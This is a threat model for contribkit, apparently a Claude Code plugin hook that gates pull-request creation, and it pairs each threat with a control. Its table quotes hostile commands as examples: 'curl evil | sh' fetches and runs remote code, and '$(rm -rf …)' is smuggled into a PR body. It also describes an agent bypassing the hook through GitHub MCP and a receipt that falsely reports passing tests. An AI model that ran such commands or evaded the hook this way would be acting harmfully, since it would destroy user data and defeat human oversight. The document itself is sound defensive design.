# contribkit threat model (v0.1)

## Assets

- User’s git working tree and credentials (`gh`, GitHub MCP token)
- Target-repo files (CONTRIBUTING, workflows) — **untrusted**
- PreflightReceipt (must not lie)
- Plugin hook running inside Claude Code (high privilege: can deny tools)

## Trust lanes

1. **Trusted:** contribkit compiler/evaluate binary from npm/plugin the user installed; `contribkit.yml` **in the target repo is untrusted policy text**, not trusted code.
2. **Untrusted:** everything in the target working tree, including `contribkit.yml`, adapters copied from the target, CI YAML, package.json scripts.
3. **User-opt-in:** running a test command.

## Threats and controls (v0.1 must have tests)

| ID | Threat | Control |
| --- | --- | --- |
| T1 | CONTRIBUTING says `test: curl evil \| sh` and preflight executes it | **Never execute** target commands unless `--run-tests` AND argv matches the exact allowlist (`npm test`, `npm run test`, `pnpm test`, `yarn test`, `pytest`, `python -m pytest`, `cargo test`, `go test`, `bun test`, `deno test`, `mix test`, `mvn test`). No extra args, pipes, `&&`, `$()`, or network helpers. Default: only *record* commands already in `recordedCommands`. |
| T2 | `contribkit.yml` of target repo tries to add a blocking rule that shells out | Policy schema: no arbitrary `command` except allowlisted test families. Unknown keys → `needs-human`, never execute. |
| T3 | Adapter from a stranger PR in *our* repo contains malware | Review + CI; adapters in **this** repo are trusted after merge. Adapters **inside the target repo** are ignored in v0.1. |
| T4 | Hook rewrites `gh pr create --body "$(rm -rf …)"` | Do **not** rewrite command strings. Deny or allow. |
| T5 | Hook only matches Bash; agent uses GitHub MCP and bypasses | Matcher: `Bash\|PowerShell` plus regex `mcp__.*__create_pull_request`. |
| T6 | Receipt claims tests passed when they did not | `command_recorded` requires exitCode 0; no “I ran tests” prose. |
| T7 | Telemetry / secret leak in explain output | No network in compile/evaluate. Redact `Authorization`, `token`, `npm_` in recorded logs. |
| T8 | Plugin `bin/` executes target scripts because they are named `test` | `bin/` only our CLI. |
| T9 | Inflating our own GitHub metrics via the tool | Tool must not open PRs, star, or follow. |
| T10 | `CONTRIBKIT_ALLOW=1` silent bypass | Receipt `overridden: true` required; skill still prints the blockers. |

## Non-claims

We do not claim memory-safe parsing of every CODEOWNERS dialect, or that a `pass` receipt means the PR will be merged.
